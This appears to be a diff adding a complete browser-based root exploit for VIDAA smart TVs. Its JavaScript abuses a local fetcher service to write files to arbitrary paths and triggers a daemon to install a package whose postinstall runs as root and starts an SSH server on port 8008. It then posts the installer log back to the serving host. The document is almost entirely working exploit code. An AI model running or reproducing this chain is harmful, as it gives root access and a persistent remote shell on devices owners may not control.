@@ -1,0 +1,67 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>vidaa root installer</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace"><pre id="o">START</pre>
+<script>
+/* Runs inside the TV browser. Pulls sw2.js and installer.ipk through the
+   TV's own fetcher (which writes arbitrary paths as uid 314), then asks the
+   superwatch daemon to install the IPK. Its postinst runs as root, creates
+   /APPS/.re_sshd, deploys dropbear and starts it on port 8008. */
+var O = document.getElementById('o');
+function log(m){ O.textContent += "\n" + m; return m; }
+var BASE = "http://" + location.host + "/pub/";
+var FUNC_URL = "https://localhost:9888/function/system/fetch/sw2";
+var FN_PATH = "/APPS/pkgs/tv.vidaa.jsservice.system/CHA/functions/fetch/sw2.js";
+
+function post(t){ try{ var x=new XMLHttpRequest(); x.open("POST","/recon",false);
+  x.setRequestHeader("Content-Type","text/plain"); x.send(t); }catch(e){} }
+
+function startFetcher(){
+  return new Promise(function(resolve){
+    try{
+      var ws = new WebSocket("wss://localhost:9888");
+      ws.onopen = function(){
+        ws.send(JSON.stringify({path:"phoenix://service/basic/fetcher", method:"start",
+                                parameters:{}, session:901, timeout:10}));
+        setTimeout(function(){ try{ ws.close(); }catch(e){} resolve("fetcher start sent"); }, 1200);
+      };
+      ws.onerror = function(){ resolve("fetcher start: ws error"); };
+      setTimeout(function(){ resolve("fetcher start: timeout"); }, 5000);
+    }catch(e){ resolve("fetcher start EXC " + e.message); }
+  });
+}
+
+function writeFile(name, target, mode){
+  return new Promise(function(resolve){
+    var args = JSON.stringify({url: BASE + name, directory: target, permission: mode || 420});
+    try{
+      var r = vowOS.service.syncExecute("basic/fetcher", {api:"fetchFile", args: args});
+      resolve(name + " -> " + JSON.stringify(r.ret) + " " + JSON.stringify(r.msg).slice(0,80));
+    }catch(e){ resolve(name + " EXC " + e.message); }
+  });
+}
+
+function trigger(){
+  return new Promise(function(resolve){
+    try{
+      var x = new XMLHttpRequest();
+      x.open("POST", FUNC_URL, false);
+      x.setRequestHeader("identifier", "");
+      x.send(JSON.stringify({list:["90:82:90;/APPS/installer.ipk;re.installer;"]}));
+      resolve("trigger -> " + String(x.responseText||"").slice(0,300));
+    }catch(e){ resolve("trigger EXC " + e.name + ": " + e.message); }
+  });
+}
+
+setTimeout(async function(){
+  var out = [];
+  out.push(await startFetcher());
+  out.push(await writeFile("sw2.js", FN_PATH, 420));
+  out.push(await writeFile("installer.ipk", "/APPS/installer.ipk", 420));
+  out.push(await trigger());
+  try{
+    var p = vowOS.service.syncExecute("hiutils", {api:"fileRead", args:{mode:6, path:".re_sshd/installer_log.txt"}});
+    out.push("log=" + (p.ret ? p.msg.slice(0,400) : "ERR"));
+  }catch(e){ out.push("log EXC " + e.message); }
+  post("INSTALL\n" + out.join("\n"));
+  log(out.join("\n"));
+}, 1000);
+</script></body></html>
